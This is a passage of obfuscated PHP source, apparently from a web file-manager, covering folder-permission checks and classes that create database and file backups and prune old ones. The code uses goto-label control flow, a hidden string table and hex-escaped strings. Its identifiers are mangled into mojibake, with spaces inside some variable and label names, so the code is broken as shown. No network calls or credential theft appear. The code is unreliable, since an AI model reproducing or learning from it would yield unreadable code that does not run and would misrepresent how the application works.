array_values(array_unique($Bö†≥ãë†¨)); goto F¥££È∫Ñï; díÎ¢ÿ∑÷ë: $b¨ áàµç¿ = Model($C´Ò≈ï•›Ω[1084]); $b“ÛÇœ–Ù€ = Model($C´Ò≈ï•›Ω[454]); if ($a˘Æÿ∫ˆ®Ω) { $cû™‹ó˜§ß = $b¨ áàµç¿->where(array($C´Ò≈ï•›Ω[366] => array($C´Ò≈ï•›Ω[381], $a˘Æÿ∫ˆ®Ω)))->select(); foreach ($cû™‹ó˜§ß as $BïÑﬁ–¬Òº) { $Dƒì‚≠Àêî = $b¨ áàµç¿->parentLevelArray($BïÑﬁ–¬Òº[$C´Ò≈ï•›Ω[455]]); $Bö†≥ãë†¨ = array_merge($Bö†≥ãë†¨, $Dƒì‚≠Àêî); $f˜ï∑Üè’å[] = $BïÑﬁ–¬Òº[$C´Ò≈ï•›Ω[452]]; } } goto CÔ€ë¥÷≠Ò; F¥££È∫Ñï: return $Bö†≥ãë†¨; goto AÈê›ä∫„¢; fï∆„°«õ·: if ($DÿÁÇò◊¢•) { $b˜â‡íø€˜ = array(array($C´Ò≈ï•›Ω[368] => SourceModel::TYPE_USER, $C´Ò≈ï•›Ω[452] => USER_ID), array($C´Ò≈ï•›Ω[368] => SourceModel::TYPE_GROUP, $C´Ò≈ï•›Ω[452] => array($C´Ò≈ï•›Ω[381], $DÿÁÇò◊¢•)), $C´Ò≈ï•›Ω[912] => $C´Ò≈ï•›Ω[2095]); } if ($d¿ßëˆ≠´â) { $b˜â‡íø€˜ = array($b˜â‡íø€˜, $C´Ò≈ï•›Ω[2143] => array($C´Ò≈ï•›Ω[2166], $d¿ßëˆ≠´â)); } $D‹ƒ¥‘˜ë¬ = $this->field($C´Ò≈ï•›Ω[2167])->where($b˜â‡íø€˜)->select(); goto DﬁÌÖìµÆ™; b∂ó∞›◊°Ò: $DÿÁÇò◊¢• = Session::get($C´Ò≈ï•›Ω[2127]); $DÿÁÇò◊¢• = array_to_keyvalue($DÿÁÇò◊¢•, $C´Ò≈ï•›Ω[33], $C´Ò≈ï•›Ω[2013]); $b˜â‡íø€˜ = array($C´Ò≈ï•›Ω[368] => SourceModel::TYPE_USER, $C´Ò≈ï•›Ω[452] => USER_ID); goto fï∆„°«õ·; DﬁÌÖìµÆ™: $a˘Æÿ∫ˆ®Ω = array_to_keyvalue($D‹ƒ¥‘˜ë¬, $C´Ò≈ï•›Ω[33], $C´Ò≈ï•›Ω[366]); $Bö†≥ãë†¨ = array(); $f˜ï∑Üè’å = $DÿÁÇò◊¢•; goto díÎ¢ÿ∑÷ë; f‹ÛÜÃ—∆á: $C´Ò≈ï•›Ω =& $_SERVER[£¿ÌÙëü¡¯¯]; static $Bö†≥ãë†¨ = false; if ($Bö†≥ãë†¨) { return $Bö†≥ãë†¨; } goto BƒÈ§¿ùπö; CÔ€ë¥÷≠Ò: $f˜ï∑Üè’å = array_values(array_unique($f˜ï∑Üè’å)); $cÛ¨¢”÷”œ = $f˜ï∑Üè’å; foreach ($cÛ¨¢”÷”œ as $Fπ§ˆˆîåœ) { $Cê¥∞£Éˆì = $b“ÛÇœ–Ù€->getInfo($Fπ§ˆˆîåœ); $Dƒì‚≠Àêî = $b¨ áàµç¿->parentLevelArray($Cê¥∞£Éˆì[$C´Ò≈ï•›Ω[455]]); $f˜ï∑Üè’å = array_merge($f˜ï∑Üè’å, $Dƒì‚≠Àêî); } goto eÖ–éÍƒ„Ì; BƒÈ§¿ùπö: $fêÈåº›Œå = Model($C´Ò≈ï•›Ω[2165])->listData(); $d¿ßëˆ≠´â = array(); foreach ($fêÈåº›Œå as $DÕÜÑ„Ç≈ñ) { if ($DÕÜÑ„Ç≈ñ[$C´Ò≈ï•›Ω[373]] == 0 && $DÕÜÑ„Ç≈ñ[$C´Ò≈ï•›Ω[2033]] == $C´Ò≈ï•›Ω[84]) { $d¿ßëˆ≠´â[] = $DÕÜÑ„Ç≈ñ[$C´Ò≈ï•›Ω[364]]; } } goto b∂ó∞›◊°Ò; AÈê›ä∫„¢: } private function makeSourceAuth($cÈü◊ÉóÒñ, $eâüòëÙÂ—) { goto Bä¿ÈÚà†∂; CëﬁùÛçÌ: if (!$EåÒ∆ƒø±â) { $eÔÕˆ«ä©ä = array_to_keyvalue($eÔÕˆ«ä©ä, $d÷ªëª®¡¬[2013]); $cÓé¡Æ∑ãç = $cÈü◊ÉóÒñ[$d÷ªëª®¡¬[452]]; $D∆“Íòãﬁº = isset($eÔÕˆ«ä©ä[$cÓé¡Æ∑ãç]) ? $eÔÕˆ«ä©ä[$cÓé¡Æ∑ãç] : !1; if ($D∆“Íòãﬁº) { $EåÒ∆ƒø±â = array($d÷ªëª®¡¬[2168] => intval($D∆“Íòãﬁº[$d÷ªëª®¡¬[373]][$d÷ªëª®¡¬[373]]), $d÷ªëª®¡¬[2169] => $D∆“Íòãﬁº[$d÷ªëª®¡¬[373]]); } } if ((!$EåÒ∆ƒø±â || $EåÒ∆ƒø±â[$d÷ªëª®¡¬[374]] <= 0) && $cÈü◊ÉóÒñ[$d÷ªëª®¡¬[368]] == SourceModel::TYPE_GROUP) { $fÌ¥ﬂ«äŸ√ = $this->authDeepCheck($cÈü◊ÉóÒñ[$d÷ªëª®¡¬[366]], $EåÒ∆ƒø±â); if ($fÌ¥ﬂ«äŸ√) { $EåÒ∆ƒø±â = $fÌ¥ﬂ«äŸ√; } } return $EåÒ∆ƒø±â; goto e·Í«Ü€…–; Bä¿ÈÚà†∂: $d÷ªëª®¡¬ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÔÕˆ«ä©ä = Session::get($d÷ªëª®¡¬[2127]); $Bç’◊ÖëÒÉ = Model($d÷ªëª®¡¬[1084])->parentLevelArray($cÈü◊ÉóÒñ[$d÷ªëª®¡¬[455]]); goto Aâ“‰·íΩÓ; Aâ“‰·íΩÓ: $Bç’◊ÖëÒÉ = array_merge(array($cÈü◊ÉóÒñ[$d÷ªëª®¡¬[366]]), array_reverse($Bç’◊ÖëÒÉ)); $EåÒ∆ƒø±â = !1; foreach ($Bç’◊ÖëÒÉ as $e›·åÂ‡éè) { if (!isset($eâüòëÙÂ—[$e›·åÂ‡éè])) { continue; } $dñ‚õ¡¿ Ô = $this->authMake($eâüòëÙÂ—[$e›·åÂ‡éè]); if ($dñ‚õ¡¿ Ô[$d÷ªëª®¡¬[414]]) { $EåÒ∆ƒø±â = $dñ‚õ¡¿ Ô; break; } } goto CëﬁùÛçÌ; e·Í«Ü€…–: } public function authOwnerApply($F÷”πäŸã¢) { goto féÒ†Õ”°Ú; b íìÊª∆ÿ: $F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[373]][$d¡œ¡Ö‚àÑ[2172]] = Model($d¡œ¡Ö‚àÑ[466])->userListInfo($C¥È¿∏¿Öú); return $F÷”πäŸã¢; goto a¿∏Ø∏Í±¢; Fîé∆ÃÀüÖ: $Cú≈˜“öê£ = array(); $C¥È¿∏¿Öú = array(); foreach ($eÒÁÎ≤õÌÎ as $CñƒÈê‡Ô => $EﬁÜç§§ßú) { $bë¿¶ ∆Òã = $this->authFolderOwnerUser($EﬁÜç§§ßú); $Cú≈˜“öê£[$CñƒÈê‡Ô] = $bë¿¶ ∆Òã; $C¥È¿∏¿Öú = array_merge($C¥È¿∏¿Öú, $bë¿¶ ∆Òã[$d¡œ¡Ö‚àÑ[527]]); if ($bë¿¶ ∆Òã[$d¡œ¡Ö‚àÑ[2171]]) { break; } } goto Bõ»§®∑æ†; féÒ†Õ”°Ú: $d¡œ¡Ö‚àÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (empty($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[373]]) || isset($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[2170]]) && $F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[2170]]) { return $F÷”πäŸã¢; } if (AuthModel::authCheckRoot($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[373]][$d¡œ¡Ö‚àÑ[374]])) { return $F÷”πäŸã¢; } goto A≥ëÔÃ… ≈; CµÏ•¡–ëÕ: $aãÔﬁÃŸ¶Õ = array($d¡œ¡Ö‚àÑ[380] => array($d¡œ¡Ö‚àÑ[381], $bºâ§∑™Ê)); $eÒÁÎ≤õÌÎ = $this->field($f–€âΩ·—)->where($aãÔﬁÃŸ¶Õ)->select(); $eÒÁÎ≤õÌÎ = array_to_keyvalue_group($eÒÁÎ≤õÌÎ, $d¡œ¡Ö‚àÑ[366]); goto Fîé∆ÃÀüÖ; A≥ëÔÃ… ≈: $bºâ§∑™Ê = Model($d¡œ¡Ö‚àÑ[1084])->parentLevelArray($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[455]]); $bºâ§∑™Ê = array_merge(array($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[366]]), array_reverse($bºâ§∑™Ê)); $f–€âΩ·— = $d¡œ¡Ö‚àÑ[2162]; goto CµÏ•¡–ëÕ; Bõ»§®∑æ†: if (count($C¥È¿∏¿Öú) == 0) { $C¥È¿∏¿Öú = $this->authFolderOwnerGroup($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[452]]); } $C¥È¿∏¿Öú = array_unique($C¥È¿∏¿Öú); if (AuthModel::authCheckRoot($F÷”πäŸã¢[$d¡œ¡Ö‚àÑ[373]][$d¡œ¡Ö‚àÑ[374]])) { $C¥È¿∏¿Öú[] = USER_ID; } goto b íìÊª∆ÿ; a¿∏Ø∏Í±¢: } private function authFolderOwnerGroup($DŸØƒö¯≠é) { $Eèè°»çÂË =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÏâ◊Ù€Öç = Model($Eèè°»çÂË[2089])->where(array($Eèè°»çÂË[2013] => $DŸØƒö¯≠é))->select(); $EƒÌöÿüëï = array(); if (!$cÏâ◊Ù€Öç) { return $EƒÌöÿüëï; } foreach ($cÏâ◊Ù€Öç as $d¨ÖŸ“∞ëÛ) { $Dî≠Èí€ã· = $this->authInfo($d¨ÖŸ“∞ëÛ); if (AuthModel::authCheckRoot($Dî≠Èí€ã·[$Eèè°»çÂË[373]])) { $EƒÌöÿüëï[] = $d¨ÖŸ“∞ëÛ[$Eèè°»çÂË[1349]]; } } return $EƒÌöÿüëï; } private function authFolderOwnerUser($E∂‡Ñﬂ·ä÷) { $C„÷‹≠ÿØÈ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÍ¡…Ô¶ø = array(); $FéƒÚùπ–å = !1; foreach ($E∂‡Ñﬂ·ä÷ as $d≈™…ó∫ˆª) { $cÍ˘íÇ±É” = $this->authInfo($d≈™…ó∫ˆª); if ($d≈™…ó∫ˆª[$C„÷‹≠ÿØÈ[452]] == $C„÷‹≠ÿØÈ[464]) { $FéƒÚùπ–å = !0; } if ($d≈™…ó∫ˆª[$C„÷‹≠ÿØÈ[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cÍ˘íÇ±É”[$C„÷‹≠ÿØÈ[373]])) { $DÍ¡…Ô¶ø[] = $d≈™…ó∫ˆª[$C„÷‹≠ÿØÈ[452]]; } } } return array($C„÷‹≠ÿØÈ[527] => $DÍ¡…Ô¶ø, $C„÷‹≠ÿØÈ[2171] => $FéƒÚùπ–å); } public function authMake($Aìõ°÷°Î—) { goto D£çÂ√õ≠’; A‰ÚËÊìâÕ: $D¡Â‹§ò∑¥ = 0; $EÜÆß≠®Á· = 0; $Fø®ßΩÍˆ≤ = 0; goto A˘Ùâÿ∂Á—; eï™åÑÆó: $Aüò«ì¢‡∫ = 0; foreach ($Aìõ°÷°Î— as $F£´∞√Êñ≥) { $F÷ıçá‰◊ä = $this->authInfo($F£´∞√Êñ≥); $Dö±§ê≥Ë‰ = $F£´∞√Êñ≥[$D¬•É≈∫ïè[452]]; $DñÓ◊ÙâñÆ = intval($F÷ıçá‰◊ä[$D¬•É≈∫ïè[373]]); if ($F£´∞√Êñ≥[$D¬•É≈∫ïè[368]] == SourceModel::TYPE_USER && $Dö±§ê≥Ë‰ == USER_ID) { $FÆÛéó†‡à = !0; $EÜÆß≠®Á· = $F÷ıçá‰◊ä; $f¢ËûÏÜﬁê = $DñÓ◊ÙâñÆ; } else { if ($F£´∞√Êñ≥[$D¬•É≈∫ïè[368]] == SourceModel::TYPE_GROUP && in_array($Dö±§ê≥Ë‰, $E±‡»Öú°À)) { $E•“ÖÛ¬˜© = !0; if ($DñÓ◊ÙâñÆ >= $fÜ‘¡Çê¥è) { $fÜ‘¡Çê¥è = $DñÓ◊ÙâñÆ; $Fø®ßΩÍˆ≤ = $F÷ıçá‰◊ä; } } else { if ($Dö±§ê≥Ë‰ == $D¬•É≈∫ïè[464]) { $Aüò«ì¢‡∫ = !0; $EÖãª¬•¡⁄ = $F÷ıçá‰◊ä; $D¡Â‹§ò∑¥ = $DñÓ◊ÙâñÆ; } } } } $CæìÊ°«∆Ï = $FÆÛéó†‡à ? $f¢ËûÏÜﬁê : ($E•“ÖÛ¬˜© ? $fÜ‘¡Çê¥è : $D¡Â‹§ò∑¥); goto bƒ¥“â∞è; b¡‚–Æ™ï£: $E±‡»Öú°À = array_to_keyvalue($eºªãä‹ïÍ, $D¬•É≈∫ïè[33], $D¬•É≈∫ïè[2013]); $f¢ËûÏÜﬁê = 0; $fÜ‘¡Çê¥è = 0; goto A‰ÚËÊìâÕ; A˘Ùâÿ∂Á—: $EÖãª¬•¡⁄ = 0; $FÆÛéó†‡à = 0; $E•“ÖÛ¬˜© = 0; goto eï™åÑÆó; D£çÂ√õ≠’: $D¬•É≈∫ïè =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$Aìõ°÷°Î—) { return array($D¬•É≈∫ïè[374] => 0, $D¬•É≈∫ïè[414] => !1); } $eºªãä‹ïÍ = Session::get($D¬•É≈∫ïè[2127]); goto b¡‚–Æ™ï£; bƒ¥“â∞è: $F÷ıçá‰◊ä = $FÆÛéó†‡à ? $EÜÆß≠®Á· : ($E•“ÖÛ¬˜© ? $Fø®ßΩÍˆ≤ : $EÖãª¬•¡⁄); $aµó—ê®“¯ = array($D¬•É≈∫ïè[2168] => intval($CæìÊ°«∆Ï), $D¬•É≈∫ïè[2169] => $F÷ıçá‰◊ä); return $aµó—ê®“¯; goto EæÉ„˜±êÌ; EæÉ„˜±êÌ: } public function authTargetInfoMake($fÌÎüÛùŸµ) { goto FóÏªá–Ωè; FÍ‚Íó‘¨œ: return array($fÑÒ≥≈◊⁄â[2173] => $cëà£™∂í£, $fÑÒ≥≈◊⁄â[2174] => $bÌÔ™úæ£Û); goto D”“ŸÁë‚Ÿ; FóÏªá–Ωè: $fÑÒ≥≈◊⁄â =& $_SERVER[£¿ÌÙëü¡¯¯]; $cëà£™∂í£ = array(); $bÌÔ™úæ£Û = array(); goto eÉŒ≠ë¶ƒû; eÉŒ≠ë¶ƒû: foreach ($fÌÎüÛùŸµ as $Cà√æîÆí„) { if ($Cà√æîÆí„[$fÑÒ≥≈◊⁄â[368]] == SourceModel::TYPE_USER) { $cëà£™∂í£[] = intval($Cà√æîÆí„[$fÑÒ≥≈◊⁄â[452]]); } else { if ($Cà√æîÆí„[$fÑÒ≥≈◊⁄â[368]] == SourceModel::TYPE_GROUP) { $bÌÔ™úæ£Û[] = intval($Cà√æîÆí„[$fÑÒ≥≈◊⁄â[452]]); } } } if ($cëà£™∂í£) { $cëà£™∂í£ = Model($fÑÒ≥≈◊⁄â[466])->userListInfo($cëà£™∂í£); } if ($bÌÔ™úæ£Û) { $CŒÿÊä∑∏° = array($fÑÒ≥≈◊⁄â[2087] => array($fÑÒ≥≈◊⁄â[381], $bÌÔ™úæ£Û)); $bÌÔ™úæ£Û = Model($fÑÒ≥≈◊⁄â[454])->field($fÑÒ≥≈◊⁄â[2100])->where($CŒÿÊä∑∏°)->select(); $bÌÔ™úæ£Û = array_to_keyvalue($bÌÔ™úæ£Û, $fÑÒ≥≈◊⁄â[2013]); } goto FÍ‚Íó‘¨œ; D”“ŸÁë‚Ÿ: } private function authInfo($Aóêõ˘π“ö) { $F¥°≠¶ﬂ¡π =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($Aóêõ˘π“ö[$F¥°≠¶ﬂ¡π[2143]]) { $D±ÏΩÓÙÓŸ = Model($F¥°≠¶ﬂ¡π[2159])->listData($Aóêõ˘π“ö[$F¥°≠¶ﬂ¡π[2143]]); if (!$D±ÏΩÓÙÓŸ) { return !1; $Câ ïÊ‘ƒØ = Model($F¥°≠¶ﬂ¡π[2159])->listData(); $c™Ÿπ∏–ñÓ = array_filter_by_field($Câ ïÊ‘ƒØ, $F¥°≠¶ﬂ¡π[373], $F¥°≠¶ﬂ¡π[464]); return $c™Ÿπ∏–ñÓ; } $aàü·ÃÉøÜ = array_field_key($D±ÏΩÓÙÓŸ, array($F¥°≠¶ﬂ¡π[364], $F¥°≠¶ﬂ¡π[28], $F¥°≠¶ﬂ¡π[373], $F¥°≠¶ﬂ¡π[2031], $F¥°≠¶ﬂ¡π[2034])); $aàü·ÃÉøÜ[$F¥°≠¶ﬂ¡π[2175]] = $Aóêõ˘π“ö; return $aàü·ÃÉøÜ; } else { return array($F¥°≠¶ﬂ¡π[382] => 0, $F¥°≠¶ﬂ¡π[2019] => $Aóêõ˘π“ö[$F¥°≠¶ﬂ¡π[2144]], $F¥°≠¶ﬂ¡π[383] => $F¥°≠¶ﬂ¡π[33], $F¥°≠¶ﬂ¡π[2031] => $F¥°≠¶ﬂ¡π[2176]); } } } goto BÀ˘‰÷æ·ä; Fì◊œ◊˘±ÿ: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $DæÛªè‡Ô  =& $_SERVER[£¿ÌÙëü¡¯¯]; self::$name = date($DæÛªè‡Ô [674]); if (!($Aª®Ì∆èØ¶ = Model($DæÛªè‡Ô [675])->lastItem())) { $Aª®Ì∆èØ¶ = $this->initData(); } else { self::$name = $Aª®Ì∆èØ¶[$DæÛªè‡Ô [28]]; if ($Aª®Ì∆èØ¶[$DæÛªè‡Ô [676]] == $DæÛªè‡Ô [84]) { self::$name = date($DæÛªè‡Ô [677]); $FàÀÂ∞ª‰… = 0; if (isset($Aª®Ì∆èØ¶[$DæÛªè‡Ô [278]][$DæÛªè‡Ô [164]][$DæÛªè‡Ô [415]])) { $FàÀÂ∞ª‰… = (int) $Aª®Ì∆èØ¶[$DæÛªè‡Ô [278]][$DæÛªè‡Ô [164]][$DæÛªè‡Ô [415]]; } if ($Aª®Ì∆èØ¶[$DæÛªè‡Ô [28]] == self::$name) { Model($DæÛªè‡Ô [675])->remove($Aª®Ì∆èØ¶[$DæÛªè‡Ô [364]]); } $Aª®Ì∆èØ¶ = $this->initData($FàÀÂ∞ª‰…, $Aª®Ì∆èØ¶[$DæÛªè‡Ô [678]]); } else { $this->checkStore($Aª®Ì∆èØ¶[$DæÛªè‡Ô [678]]); } } self::$option = $Aª®Ì∆èØ¶; } private function initData($bå«Ó‹∂íâ = 0, $aÂÌØ‰É≤ = '') { goto Cô≈∫·Éåâ; Cãç”¥≠Ω≥: $this->checkStore($aŸ°À…¥‘‚[$a°ûá∆©–⁄[678]]); $EÍ∏é¶å”ë = array($a°ûá∆©–⁄[678] => $aŸ°À…¥‘‚[$a°ûá∆©–⁄[678]], $a°ûá∆©–⁄[28] => self::$name, $a°ûá∆©–⁄[676] => 0, $a°ûá∆©–⁄[679] => $aŸ°À…¥‘‚[$a°ûá∆©–⁄[679]], $a°ûá∆©–⁄[278] => array($a°ûá∆©–⁄[680] => array($a°ûá∆©–⁄[676] => 0), $a°ûá∆©–⁄[681] => array($a°ûá∆©–⁄[676] => 0, $a°ûá∆©–⁄[682] => 0, $a°ûá∆©–⁄[683] => 0, $a°ûá∆©–⁄[29] => $a°ûá∆©–⁄[33]), $a°ûá∆©–⁄[684] => array($a°ûá∆©–⁄[676] => 0, $a°ûá∆©–⁄[682] => 0, $a°ûá∆©–⁄[683] => 0), $a°ûá∆©–⁄[164] => array($a°ûá∆©–⁄[676] => 0, $a°ûá∆©–⁄[685] => 0, $a°ûá∆©–⁄[686] => 0, $a°ûá∆©–⁄[687] => 0, $a°ûá∆©–⁄[688] => 0, $a°ûá∆©–⁄[415] => $bå«Ó‹∂íâ)), $a°ûá∆©–⁄[689] => time(), $a°ûá∆©–⁄[690] => 0); $aéå’ø⁄˜‰ = Model($a°ûá∆©–⁄[675])->insert($EÍ∏é¶å”ë); goto B÷Û∑ßÛ∆¯; Cô≈∫·Éåâ: $a°ûá∆©–⁄ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aŸ°À…¥‘‚ = Model($a°ûá∆©–⁄[675])->config(); if ($aÂÌØ‰É≤ && $aŸ°À…¥‘‚[$a°ûá∆©–⁄[678]] != $aÂÌØ‰É≤) { $bå«Ó‹∂íâ = 0; } goto Cãç”¥≠Ω≥; B÷Û∑ßÛ∆¯: $EÍ∏é¶å”ë[$a°ûá∆©–⁄[364]] = $aéå’ø⁄˜‰; return $EÍ∏é¶å”ë; goto bªÍèÙ…üÏ; bªÍèÙ…üÏ: } private function checkStore($CÜﬁç±êï∫) { $Bàíâ⁄ıë‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; $c„éÔ≠£ÙÆ = Model($Bàíâ⁄ıë‹[691])->listData($CÜﬁç±êï∫); Model($Bàíâ⁄ıë‹[691])->checkConfig($c„éÔ≠£ÙÆ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[£¿ÌÙëü¡¯¯][675])->findByName(self::$name); } return self::$option; } public static function set($FÀÀ÷Í‚«ã) { $EÇÌæ†ÈØç =& $_SERVER[£¿ÌÙëü¡¯¯]; $bá†¬Ú◊âú = self::get(); foreach ($FÀÀ÷Í‚«ã as $b ¶©¬óªﬁ => $e◊€¯Óêﬁò) { $AÙ™†ú˘ÌÖ = explode($EÇÌæ†ÈØç[94], $b ¶©¬óªﬁ); $CéœÀÁ“ø¯ = count($AÙ™†ú˘ÌÖ); switch ($CéœÀÁ“ø¯) { case 1: $bá†¬Ú◊âú[$AÙ™†ú˘ÌÖ[0]] = $e◊€¯Óêﬁò; break; case 2: $bá†¬Ú◊âú[$AÙ™†ú˘ÌÖ[0]][$AÙ™†ú˘ÌÖ[1]] = $e◊€¯Óêﬁò; break; case 3: $bá†¬Ú◊âú[$AÙ™†ú˘ÌÖ[0]][$AÙ™†ú˘ÌÖ[1]][$AÙ™†ú˘ÌÖ[2]] = $e◊€¯Óêﬁò; break; } } Model($EÇÌæ†ÈØç[675])->update($bá†¬Ú◊âú[$EÇÌæ†ÈØç[364]], $bá†¬Ú◊âú); self::$option = $bá†¬Ú◊âú; return self::$option; } public function keep() { $d◊¨ÍÇ†âä =& $_SERVER[£¿ÌÙëü¡¯¯]; $bõõÛÚ¿õ = self::get(); if ($bõõÛÚ¿õ[$d◊¨ÍÇ†âä[278]][$d◊¨ÍÇ†âä[680]][$d◊¨ÍÇ†âä[676]] == $d◊¨ÍÇ†âä[84]) { return; } $this->backupKeep($bõõÛÚ¿õ); self::set(array($d◊¨ÍÇ†âä[692] => 1)); } private function backupKeep($EÜ⁄á¬Ÿ∑‹) { goto aƒ∂ÓÃØÖª; Eè´ˆÙµº˜: $Cá¡é≥ë°Ñ = array_unique($Cá¡é≥ë°Ñ); foreach ($FïŸ‰Ô‰ñ™ as $cØ»’∫îë®) { if (!empty($cØ»’∫îë®[$BÈÀÕõÇ®ƒ[28]]) && in_array($cØ»’∫îë®[$BÈÀÕõÇ®ƒ[28]], $Cá¡é≥ë°Ñ)) { continue; } Model($BÈÀÕõÇ®ƒ[675])->remove($cØ»’∫îë®[$BÈÀÕõÇ®ƒ[364]]); $DØÖ“÷◊˜ë = "\x7b\x69\157\x3a{$EÜ⁄á¬Ÿ∑‹[$BÈÀÕõÇ®ƒ[678]]}\175\x2f\x64\x61\164\141\x62\141\x73\145\57\x62\141\x63\x6b\165\160\137{$cØ»’∫îë®[$BÈÀÕõÇ®ƒ[28]]}"; IO::remove($DØÖ“÷◊˜ë, !1); } goto aÚØÚá‰√‹; BõëÚâæ : $Cá¡é≥ë°Ñ = array(); for ($dµ¿õó∂ûò = 0; $dµ¿õó∂ûò <= 7; $dµ¿õó∂ûò++) { $Cá¡é≥ë°Ñ[] = date($BÈÀÕõÇ®ƒ[677], strtotime("\x2d{$dµ¿õó∂ûò}\40\x64\x61\171\x73")); } for ($dµ¿õó∂ûò = 0; $dµ¿õó∂ûò < 12; $dµ¿õó∂ûò++) { $Cá¡é≥ë°Ñ[] = date($BÈÀÕõÇ®ƒ[693], strtotime("\55{$dµ¿õó∂ûò}\x20\x6d\157\156\x74\150\163")); } goto Eè´ˆÙµº˜; aƒ∂ÓÃØÖª: $BÈÀÕõÇ®ƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FïŸ‰Ô‰ñ™ = Model($BÈÀÕõÇ®ƒ[675])->listData(); if (empty($FïŸ‰Ô‰ñ™)) { return; } goto BõëÚâæ ; aÚØÚá‰√‹: } public function db() { goto D„ÂÒ◊ıôï; eíã›¨—»È: $EÿÏÊ¥™´ = new BackupDb(); if (!$EÿÏÊ¥™´->index()) { return !1; } self::set(array($BÖÙó˘¡¿Ó[694] => 1)); goto bíïòÃ≤†‰; D„ÂÒ◊ıôï: $BÖÙó˘¡¿Ó =& $_SERVER[£¿ÌÙëü¡¯¯]; $AéÓó«◊äë = self::get(); if ($AéÓó«◊äë[$BÖÙó˘¡¿Ó[278]][$BÖÙó˘¡¿Ó[681]][$BÖÙó˘¡¿Ó[676]] == $BÖÙó˘¡¿Ó[84]) { return !0; } goto eíã›¨—»È; bíïòÃ≤†‰: return !0; goto eΩ„÷Çº¨; eΩ„÷Çº¨: } public function dbFile() { goto aõÌ«®‚¡é; aõÌ«®‚¡é: $C·êÙíÖ∫√ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e–≈ä’«’å = self::get(); if ($e–≈ä’«’å[$C·êÙíÖ∫√[278]][$C·êÙíÖ∫√[684]][$C·êÙíÖ∫√[676]] == $C·êÙíÖ∫√[84]) { return !0; } goto bäáßüÛ®ó; dŸ¥£ëØúƒ: return !0; goto B›πŒ∫≥…Ø; bäáßüÛ®ó: $Cö‚ú¿ıâã = new BackupDbFile(); if (!$Cö‚ú¿ıâã->index()) { return !1; } self::set(array($C·êÙíÖ∫√[695] => 1)); goto dŸ¥£ëØúƒ; B›πŒ∫≥…Ø: } public function file() { $EÈè™ôÍè¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÒíÉ÷Ùôê = self::get(); if ($bÒíÉ÷Ùôê[$EÈè™ôÍè¨[278]][$EÈè™ôÍè¨[164]][$EÈè™ôÍè¨[676]] == $EÈè™ôÍè¨[84]) { return !0; } if (!isset($bÒíÉ÷Ùôê[$EÈè™ôÍè¨[679]]) || $bÒíÉ÷Ùôê[$EÈè™ôÍè¨[679]] == $EÈè™ôÍè¨[464]) { $bÁã’Ô≠¡∏ = new BackupFile(); if (!$bÁã’Ô≠¡∏->index()) { return !1; } } self::set(array($EÈè™ôÍè¨[696] => 1, $EÈè™ôÍè¨[676] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto A÷¢—Ÿ£™ë; CÈ„Ùú˘¶‹: self::$name = $A¥•ìª§ú˘[$A⁄‚ë∆ΩÑˆ[28]]; if ($f‰ö›Øﬁ÷å = $this->sqliteFile()) { return $this->sqliteBackup($f‰ö›Øﬁ÷å); } $eò‡ˆÀ§á† = 0; goto a∑ÑÓΩﬁÀ≠; cöΩ¶õû≠Ï: Backup::set($a≥Œ›è¶Í©); return !0; goto eÁ¬∫πÜﬂî; eË§éÙ¶„≤: $a≥Œ›è¶Í© = array($A⁄‚ë∆ΩÑˆ[702] => $A⁄‚ë∆ΩÑˆ[703], $A⁄‚ë∆ΩÑˆ[704] => $eò‡ˆÀ§á† + 1); Backup::set($a≥Œ›è¶Í©); $cŒÀãÏùÑ† = 0; goto AºÛ‚ÿΩÚŸ; AºÛ‚ÿΩÚŸ: $d≠∫“≤≠Ÿ” = TEMP_FILES . $A⁄‚ë∆ΩÑˆ[705] . self::$name . $A⁄‚ë∆ΩÑˆ[8]; del_dir($d≠∫“≤≠Ÿ”); mk_dir($d≠∫“≤≠Ÿ”); goto DÇ≈—òéï´; A÷¢—Ÿ£™ë: $A⁄‚ë∆ΩÑˆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A¥•ìª§ú˘ = Backup::get(); self::$io = $A¥•ìª§ú˘[$A⁄‚ë∆ΩÑˆ[678]]; goto CÈ„Ùú˘¶‹; a∑ÑÓΩﬁÀ≠: $båªø≠êΩ˘ = Model()->db()->getTables(); foreach ($båªø≠êΩ˘ as $BÃ÷øèæ¥∞) { $eò‡ˆÀ§á† += Model($BÃ÷øèæ¥∞)->count(); } $a—ô„ªƒæ¡ = new Task($A⁄‚ë∆ΩÑˆ[697], $A⁄‚ë∆ΩÑˆ[698], $eò‡ˆÀ§á†, LNG($A⁄‚ë∆ΩÑˆ[699]) . $A⁄‚ë∆ΩÑˆ[700] . LNG($A⁄‚ë∆ΩÑˆ[701])); goto eË§éÙ¶„≤; DÇ≈—òéï´: foreach ($båªø≠êΩ˘ as $BÃ÷øèæ¥∞) { $AÉ›¨◊ΩÀ€ = "{$d≠∫“≤≠Ÿ”}{$BÃ÷øèæ¥∞}\x2e\x73\161\x6c"; $cŒÀãÏùÑ† += $this->makeSqlFile($BÃ÷øèæ¥∞, $AÉ›¨◊ΩÀ€, $a—ô„ªƒæ¡, $A¥•ìª§ú˘); } $a—ô„ªƒæ¡->end(); $a≥Œ›è¶Í© = array($A⁄‚ë∆ΩÑˆ[694] => 1, $A⁄‚ë∆ΩÑˆ[706] => $cŒÀãÏùÑ†); goto 